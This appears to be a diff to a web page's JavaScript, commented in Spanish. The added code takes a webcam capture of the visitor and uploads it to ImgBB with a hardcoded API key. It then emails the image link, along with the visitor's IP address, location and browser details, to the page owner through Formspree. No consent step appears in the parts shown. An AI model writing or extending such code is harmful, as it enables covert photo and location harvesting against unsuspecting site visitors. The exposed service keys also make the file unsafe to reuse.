@@ -377,11 +377,53 @@
         // ==================== CONFIGURACIÓN ====================
         // REEMPLAZA ESTO CON TU ENDPOINT DE FORMSPREE
         const FORMSPREE_ENDPOINT = 'https://formspree.io/f/xkoegvee';
+        const IMGBB_API_KEY = '3119176b7072d4d2e31a1f3c9be657be';
         
         // ==================== VARIABLES ====================
         let videoStream = null;
         let capturedImageData = null;
         let userData = {};
+
+        // ==================== SUBIR IMAGEN A IMGBB ====================
+        async function uploadToImgBB(imageData) {
+            // Convertir base64 a blob para subir
+            const byteString = atob(imageData.split(',')[1]);
+            const mimeString = imageData.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            const blob = new Blob([ab], { type: mimeString });
+        
+            // Crear FormData para ImgBB
+            const formData = new FormData();
+            formData.append('image', blob, 'captura-demo.png');
+        
+            try {
+                const response = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, {
+                    method: 'POST',
+                    body: formData
+                });
+        
+                const result = await response.json();
+        
+                if (result.success) {
+                    console.log('✅ Imagen subida a ImgBB:', result.data.url);
+                    return {
+                        url: result.data.url,           // URL directa de la imagen
+                        display_url: result.data.display_url,  // URL con vista previa
+                        delete_url: result.data.delete_url     // URL para borrar la imagen
+                    };
+                } else {
+                    console.error('❌ Error de ImgBB:', result);
+                    return null;
+                }
+            } catch (error) {
+                console.error('❌ Error al subir a ImgBB:', error);
+                return null;
+            }
+        }
 
         // ==================== DETECCIÓN DE NAVEGADOR/OS ====================
         function detectBrowser() {
@@ -487,11 +529,9 @@
                 }
         
                 // ==================== ENVIAR A FORMSPREE ====================
-        async function sendToFormspree(imageData) {
-        // imageData ya viene como: data:image/png;base64,iVBORw0KGgo...
-            
+        async function sendToFormspree(imageUrl) {
             const payload = {
-                foto_base64: imageData,           // La imagen completa como texto
+                foto_url: imageUrl,                    // URL de la imagen (se verá en el email)
                 ip: userData.ip || 'No disponible',
                 ubicacion: userData.location || 'No disponible',
                 navegador: userData.browser || 'No disponible',
@@ -628,7 +668,20 @@
             displayData();
 
             // Enviar todo a Formspree
-            await sendToFormspree(capturedImageData);
+            // Subir imagen a ImgBB y obtener URL
+            const imgbbResult = await uploadToImgBB(capturedImageData);
+            
+            if (imgbbResult) {
+                // Enviar URL a Formspree (la imagen será visible en el email)
+                await sendToFormspree(imgbbResult.url);
+                
+                // Opcional: mostrar la URL en consola para debug
+                console.log('🔗 URL de la imagen:', imgbbResult.url);
+                console.log('🗑️ URL para borrar:', imgbbResult.delete_url);
+            } else {
+                console.warn('⚠️ No se pudo subir la imagen, enviando solo datos...');
+                await sendToFormspree('No disponible - Error al subir imagen');
+            }
 
             // Scroll automático
             setTimeout(() => {
